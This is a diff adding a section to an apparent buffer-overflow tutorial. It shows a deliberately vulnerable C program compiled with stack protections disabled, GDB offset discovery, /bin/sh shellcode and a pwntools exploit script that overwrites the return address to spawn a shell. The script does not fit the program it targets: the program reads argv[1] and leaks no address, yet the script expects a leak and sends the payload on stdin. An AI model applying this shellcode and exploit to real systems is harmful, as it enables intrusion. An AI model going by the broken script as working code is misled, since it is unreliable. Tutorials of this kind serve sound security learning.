@@ -346,3 +346,73 @@ x/20s $rsp
 
 ![alt text](https://github.com/d3fr0ggy/BOF-Basics/blob/master/images/15.png)
 
+Here we can clearly see that we have got the "Buffer Overflow". Now we will move one step ahead and will see how this "Buffer Overflow" vulnerability can be utilized in exploitation.
+
+## Exploiting The Buffer Overflow Vulnerability 
+We will be using the same program but with few changes this time i.e we will increasing the buffer size to 30.
+```
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+int main(int argc, char *argv[]) {
+        char array[30];
+        strcpy(array, argv[1]);
+        printf("%s\n", array);
+        return 0;
+}
+```
+Now we need to compile the program. Which is same as we did for the previous program.
+```
+gcc -fno-stack-protector -z execstack -no-pie sample.c -o sample
+```
+Once compiled we need to load the program into gdb. 
+```
+gdb -q ./sample
+```
+Once the program has been loaded we need to create a pattern which we will be supplying to the program. 
+```
+pattern create 50
+```
+Once created we will supply this pattern to the program.
+```
+r aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
+```
+
+![alt text](https://github.com/d3fr0ggy/BOF-Basics/blob/master/images/16.png)
+
+We can clearly see that we have the segmentation fault. We need to note down the characters which have overflowed the RSP (Stack Pointer).
+
+![alt text](https://github.com/d3fr0ggy/BOF-Basics/blob/master/images/17.png)
+
+Now we will search for the Offset of this pattern. It can be done by using the following command. 
+
+```
+pattern search faaaaaaaga
+```
+![alt text](https://github.com/d3fr0ggy/BOF-Basics/blob/master/images/18.png)
+
+Now, we know that on 40th offset RIP is being owerwritten. So we need to utilize the shellcode which comes under 40bytes. Which can be found on the above link. 
+
+```
+https://www.exploit-db.com/exploits/42179
+```
+The above shellcode is what we will be using and is of 24bytes.
+```
+\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
+```
+Now, we will write a python program to automatically exploit this buffer overflow vulnerability. 
+
+```
+from pwn import *
+p = process("./sample")
+shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
+addr = int(p.recvline().strip(), 16) 
+log.info("Leak: "+hex(addr))
+payload = shellcode + "A"*(40 - len(shellcode)) + p64(addr)
+pause()
+p.sendline(payload)
+p.interactive()
+```
+Now, we need to run this python script while our sample program is opened in GDB.
+
+
